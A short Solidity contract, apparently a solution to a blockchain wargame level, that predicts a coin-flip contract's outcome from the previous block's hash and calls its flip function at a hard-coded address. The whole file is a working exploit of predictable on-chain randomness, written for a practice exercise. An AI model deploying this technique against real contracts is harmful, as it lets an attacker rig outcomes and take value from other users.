// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./coinFlip.sol";

contract CoinFlipper {
    CoinFlip public coinFlip = CoinFlip(0x46A52996B4e73cf21fcC9E4527B7d5D1ccb5BA99);
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function flipToWin() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 flip = blockValue / FACTOR;
        bool side = flip == 1 ? true : false;
        coinFlip.flip(side);
    }
}
